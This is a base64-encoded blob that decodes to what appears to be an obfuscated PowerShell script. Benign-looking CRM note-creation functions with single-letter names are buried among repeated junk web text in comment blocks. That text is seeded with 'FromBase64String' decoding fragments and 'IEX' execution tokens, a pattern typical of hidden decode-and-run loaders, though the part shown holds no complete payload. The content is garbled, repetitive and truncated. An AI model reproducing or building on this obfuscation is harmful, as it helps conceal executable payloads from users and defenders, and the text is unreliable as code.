nkgb3IgcHJhY3RpY2UgZm9yIHIoKSBiZWVzLiBJZiBhbiBxKCkgd29yZCBvKCksIHAoKSB1cCB0aGUgbWVhbmluZyB3aWxsIGhlbHAgc3R1ZGVudHMgaW5jcmVhc2UgdGhlIG51bWJlciBvZiB3b3JkcyB0aGV5IGtub3cuIFdvcmtpbmcgd2l0aCBhIHBhcnRuZXIsIHN0dWRlbnRzIGNhbiB0ZXN0IGVhY2ggb3RoZXIgb24gdGhlIHIoKSBmb3IgdGhlIHJhbmRvbWl6ZWQgd29yZHMgbSgpZC4KCk5hbWUgSW5zcGlyYXRpb24KSWYgeW91IG5lZWQgdG8gY3JlYXRlIGEgbmFtZSBmb3IgYSBwcm9kdWN0LCBhbiBldmVudCwgYSBiYW5kIG9yIGZvciBhbnl0aGluZyBlbHNlLCB0aGlzIHRvb2wgY2FuIGJlIHF1aXRlIGhlbHBmdWwuIEFzIHlvdSBjb25zaWRlciBuYW1lcywgbSgpIGEgbnVtYmVyIG9mIHJhbmRvbSB3b3JkcyBhbmQgc2VlIGhvdyB0aGV5IGltcGFjdCB3aGF0IHlvdSBoYXZlIGFscmVhZHkgY29tZSB1cCB3aXRoLiBJbnB1dHRpbmcgdW5pcXVlIHdvcmRzIHlvdSBtYXkgbm90IGhhdmUgY29uc2lkZXJlZCBjYW4gc3BhcmsgYWRkaXRpb25hbCBjcmVhdGl2aXR5IHRvIGV2ZW50dWFsbHkgaGVscCB5b3UgcHJvZHVjZSB0aGUgcGVyZmVjdCBuYW1lIGZvciB5b3VyIHByb2plY3QuIElmIHlvdSdyZSBwKCkgZm9yIGdvb2QgY2hhcmFjdGVyIG5hbWVzIG9yIGJhYnkgbmFtZXMsIHlvdSBtaWdodCBiZSBpbnRlcmVzdGVkIGluIG91ciByYW5kb20gbmFtZSBnZW5lcmF0b3IuCgpUaGUgYWJvdmUgbGlzdCBpcyBub3QgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyguIFRoZXJlIGFyZSBsaXRlcmFsbHkgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyggb2Ygd2F5cyB0aGUgUmFuZG9tIFdvcmQgR2VuZXJhdG9yIGNhbiBiZSB1c2VkLiBQbGVhc2UgZmVlbCBmcmVlIHRvIHNoYXJlIHRoZSB3YXkgeW91IHVzZSB0aGlzIHRvb2wsIGFuZCB3ZSBhbHdheXMgd2VsY29tZSBzdWdnZXN0aW9ucyBvbiBob3cgd2UgY2FuIGltcHJvdmUgaXQgdG8gc2VydmUgeW91IGJldHRlci4gV2UgYXJlIGFsc28gaW50ZXJlc3RlZCBpbiBuZXcgd29yZCBnZW5lcmF0b3JzIHlvdSdkIGJlIGludGVyZXN0ZWQgaW4gdXMgY3JlYXRpbmcuIE1hbnkgb2YgdGhlIHRvb2xzIG9uIHRoaXMgd2Vic2l0ZSBjYW1lIGZyb20gaWRlYXMgZnJvbSBwZW9wbGUgbGlrZSB5b3Ugd2hvIGNvbnRhY3RlZCB1cy4gUGxlYXNlIHRha2UgdGhlIHRpbWUgdG8gZXhwbG9yZSB0aGUgb3RoZXIgcmFuZG9tIGdlbmVyYXRvcnMgd2UgaGF2ZSBhdmFpbAoKIz48Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSBiKCkgSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIHJlc3Ryb29tIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxJIHdhcyBhdCBhIHN3YW5rIGJhciBmb3IgYSB3b3JrIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoLCBlKCkgc29tZSBncmFkIHN0dWRlbnRzIHdlIGooKSBmb3IgYW4gaCgpIHByb2dyYW0uIEFmdGVyIHdlIGhhZCBhbGwgaGFkIGsoKSBkcmlua3MsIG9uZSBvZiB0aGUgc3R1ZGVudHMgc2FpZCB0aGV5IGRvbnQgbGlrZSBzbW9rZXMgYmVjYXVzZSB0aGV5IHRhc3RlIGxpa2UgYS4gTXkgYm9zcyByZXBsaWVkLCBtYXliZSB5b3UgaGF2ZW50IGhhZCBnb29kIHNtb2tlcy4gU28gSSBjdXQgaW4sIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2QgYS4gSSB3YXMgYXNrZWQgdG8gbGVhdmUu4oCdU291cmNlIz4KPCNUaGF0cyBnKCkgT25lIHRpbWUgSSBhdGUgMjYgY2hvY29sYXRlIGNoaXAgaSgpIGJlY2F1c2UgSSB3YXMgbWFkIGF0IG15IGxpdHRsZSBsKCkgYW5kIGRpZG50IHdhbnQgaGVyIHRvIGhhdmUgYW55LiBJIHB1a2VkIGFsbCBvdmVyIHRoZSBwbGFjZS7igJ0gU291cmNlIz4KPCPigJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSByZXN0cm9vbSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KZnVuY3Rpb24ga3sKCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUEFSQU0oCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbTWljcm9zb2Z0LlhybS5Ub29saW5nLkNvbm5lY3Rvci5Dcm1TZXJ2aWNlQ2xpZW50XSRjb25uLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0xLCBQYXJhbWV0ZXJTZXROYW1lPSJDcm1SZWNvcmQiKV0KICAgICAgICBbUFNPYmplY3RdJENybVJlY29yZCwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249MSwgUGFyYW1ldGVyU2V0TmFtZT0iTmFtZVdpdGhJZCIpXQogICAgICAgIFtzdHJpbmddJEVudGl0eUxvZ2ljYWxOYW1lLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0yLCBQYXJhbWV0ZXJTZXROYW1lPSJOYW1lV2l0aElkIildCiAgICAgICAgW2d1aWRdJElkLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0zKV0KICAgICAgICBbc3RyaW5nXSRTdWJqZWN0LAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj00KV0KICAgICAgICBbc3RyaW5nXSROb3RlVGV4dCAKICAgICkKCSRjb25uID0gVmVyaWZ5Q3JtQ29ubmVjdGlvblBhcmFtIC1jb25uICRjb25uIC1waXBlbGluZVZhbHVlICgkUFNCb3VuZFBhcmFtZXRlcnMuQ29udGFpbnNLZXkoJ2Nvbm4nKSkgICAKICAgIGlmKCRDcm1SZWNvcmQgLW5lICRudWxsKQogICAgewogICAgICAgICRFbnRpdHlMb2dpY2FsTmFtZSA9ICRDcm1SZWNvcmQubG9naWNhbG5hbWUKICAgICAgICAkSWQgPSAkQ3JtUmVjb3JkLigkRW50aXR5TG9naWNhbE5hbWUgKyAiaWQiKQogICAgfQogICAgJG5ld2ZpZWxkcyA9IE5ldy1PYmplY3QgJ1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkRpY3Rpb25hcnlbW1N0cmluZ10sIFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybURhdGFUeXBlV3JhcHBlcl1dJwogICAgJHN1YmplY3RmaWVsZCA9IE5ldy1PYmplY3QgLVR5cGVOYW1lICdNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybURhdGFUeXBlV3JhcHBlcicKICAgICRzdWJqZWN0ZmllbGQuVHlwZSA9IFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybUZpZWxkVHlwZV06OlN0cmluZwogICAgJHN1YmplY3RmaWVsZC5WYWx1ZSA9ICRTdWJqZWN0CiAgICAkbm90ZVRleHRmaWVsZCA9IE5ldy1PYmplY3QgLVR5cGVOYW1lICdNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybURhdGFUeXBlV3JhcHBlcicKICAgICRub3RlVGV4dGZpZWxkLlR5cGUgPSBbTWljcm9zb2Z0LlhybS5Ub29saW5nLkNvbm5lY3Rvci5Dcm1GaWVsZFR5cGVdOjpTdHJpbmcKICAgICRub3RlVGV4dGZpZWxkLlZhbHVlID0gJE5vdGVUZXh0CiAgICAkbmV3ZmllbGRzLkFkZCgic3ViamVjdCIsICRzdWJqZWN0ZmllbGQpCiAgICAkbmV3ZmllbGRzLkFkZCgibm90ZXRleHQiLCAkbm90ZVRleHRmaWVsZCkKCiAgICB0cnkKICAgIHsKICAgICAgICAkcmVzdWx0ID0gJGNvbm4uQ3JlYXRlQW5ub3RhdGlvbigkRW50aXR5TG9naWNhbE5hbWUsICRJZCwgJG5ld2ZpZWxkcywgW0d1aWRdOjpFbXB0eSkKCQlpZigkcmVzdWx0IC1lcSAkbnVsbCkKICAgICAgICB7CiAgICAgICAgICAgIHRocm93IExhc3RDcm1Db25uZWN0b3JFeGNlcHRpb24oJGNvbm4pCiAgICAgICAgfQogICAgfQogICAgY2F0Y2gKICAgIHsKICAgICAgICB0aHJvdyBMYXN0Q3JtQ29ubmVjdG9yRXhjZXB0aW9uKCRjb25uKQogICAgfQp9CjwjPj4KU3A9ZWxsaW5nIGFuZCBWb2NhYnVsYXJ5ClRoaXMgdG9vbCBjYW4gYmUgYW4gZXhjZWxsZW50IHdheSB0byBpbXByb3ZlIHZvY2FidWxhcnkgb3IgcHJhY3RpY2UgZm9yIHIoKSBiZWVzLiBJZiBhbiBxKCkgd29yZCBvKCksIHAoKSB1cCB0aGUgbWVhbmluZyB3aWxsIGhlbHAgc3R1ZGVudHMgaW5jcmVhc2UgdGhlIG51bWJlciBvZiB3b3JkcyB0aGV5IGtub3cuIFdvcmtpbmcgd2l0aCBhIHBhcnRuZXIsIHN0dWRlbnRzIGNhbiB0ZXN0IGVhY2ggb3RoZXIgb24gdGhlIHIoKSBmb3IgdGhlIHJhbmRvbWl6ZWQgd29yZHMgbSgpZC4KCk5hbWUgSW5zcGlyYXRpb24KSWYgeW91IG5lZWQgdG8gY3JlYXRlIGEgbmFtZSBmb3IgYSBwcm9kdWN0LCBhbiBldmVudCwgYSBiYW5kIG9yIGZvciBhbnl0aGluZyBlbHNlLCB0aGlzIHRvb2wgY2FuIGJlIHF1aXRlIGhlbHBmdWwuIEFzIHlvdSBjb25zaWRlciBuYW1lcywgbSgpIGEgbnVtYmVyIG9mIHJhbmRvbSB3b3JkcyBhbmQgc2VlIGhvdyB0aGV5IGltcGFjdCB3aGF0IHlvdSBoYXZlIGFscmVhZHkgY29tZSB1cCB3aXRoLiBJbnB1dHRpbmcgdW5pcXVlIHdvcmRzIHlvdSBtYXkgbm90IGhhdmUgY29uc2lkZXJlZCBjYW4gc3BhcmsgYWRkaXRpb25hbCBjcmVhdGl2aXR5IHRvIGV2ZW50dWFsbHkgaGVscCB5b3UgcHJvZHVjZSB0aGUgcGVyZmVjdCBuYW1lIGZvciB5b3VyIHByb2plY3QuIElmIHlvdSdyZSBwKCkgZm9yIGdvb2QgY2hhcmFjdGVyIG5hbWVzIG9yIGJhYnkgbmFtZXMsIHlvdSBtaWdodCBiZSBpbnRlcmVzdGVkIGluIG91ciByYW5kb20gbmFtZSBnZW5lcmF0b3IuCgpUaGUgYWJvdmUgbGlzdCBpcyBub3QgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyguIFRoZXJlIGFyZSBsaXRlcmFsbHkgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyggb2Ygd2F5cyB0aGUgUmFuZG9tIFdvcmQgR2VuZXJhdG9yIGNhbiBiZSB1c2VkLiBQbGVhc2UgZmVlbCBmcmVlIHRvIHNoYXJlIHRoZSB3YXkgeW91IHVzZSB0aGlzIHRvb2wsIGFuZCB3ZSBhbHdheXMgd2VsY29tZSBzdWdnZXN0aW9ucyBvbiBob3cgd2UgY2FuIGltcHJvdmUgaXQgdG8gc2VydmUgeW91IGJldHRlci4gV2UgYXJlIGFsc28gaW50ZXJlc3RlZCBpbiBuZXcgd29yZCBnZW5lcmF0b3JzIHlvdSdkIGJlIGludGVyZXN0ZWQgaW4gdXMgY3JlYXRpbmcuIE1hbnkgb2YgdGhlIHRvb2xzIG9uIHRoaXMgd2Vic2l0ZSBjYW1lIGZyb20gaWRlYXMgZnJvbSBwZW9wbGUgbGlrZSB5b3Ugd2hvIGNvbnRhY3RlZCB1cy4gUGxlYXNlIHRha2UgdGhlIHRpbWUgdG8gZXhwbG9yZSB0aGUgb3RoZXIgcmFuZG9tIGdlbmVyYXRvcnMgd2UgaGF2ZSBhdmFpbAoKIz48Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSByZXN0cm9vbSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KPCM+4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgcmVzdHJvb20gSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnEkgd2FzIGF0IGEgc3dhbmsgYmFyIGZvciBhIHdvcmsgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygsIGUoKSBzb21lIGdyYWQgc3R1ZGVudHMgd2UgaigpIGZvciBhbiBoKCkgcHJvZ3JhbS4gQWZ0ZXIgd2UgaGFkIGFsbCBoYWQgaygpIGRyaW5rcywgb25lIG9mIHRoZSBzdHVkZW50cyBzYWlkIHRoZXkgZG9udCBsaWtlIHNtb2tlcyBiZWNhdXNlIHRoZXkgdGFzdGUgbGlrZSBhLiBNeSBib3NzIHJlcGxpZWQsIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2Qgc21va2VzLiBTbyBJIGN1dCBpbiwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBhLiBJIHdhcyBhc2tlZCB0byBsZWF2ZS7igJ1Tb3VyY2UjPgo8I1RoYXRzIGcoKSBPbmUgdGltZSBJIGF0ZSAyNiBjaG9jb2xhdGUgY2hpcCBpKCkgYmVjYXVzZSBJIHdhcyBtYWQgYXQgbXkgbGl0dGxlIGwoKSBhbmQgZGlkbnQgd2FudCBoZXIgdG8gaGF2ZSBhbnkuIEkgcHVrZWQgYWxsIG92ZXIgdGhlIHBsYWNlLuKAnSBTb3VyY2UjPgo8I+KAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIHJlc3Ryb29tIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgpmdW5jdGlvbiBsewoKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQQVJBTSgKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybVNlcnZpY2VDbGllbnRdJGNvbm4sICAgICAgICAKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249MSwgUGFyYW1ldGVyU2V0TmFtZT0iQ3JtUmVjb3JkIiwgVmFsdWVGcm9tUGlwZWxpbmU9JHRydWUpXQogICAgICAgIFtQU09iamVjdF0kQ3JtUmVjb3JkLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0xLCBQYXJhbWV0ZXJTZXROYW1lPSJOYW1lV2l0aElkIildCiAgICAgICAgW3N0cmluZ10kRW50aXR5TG9naWNhbE5hbWUsC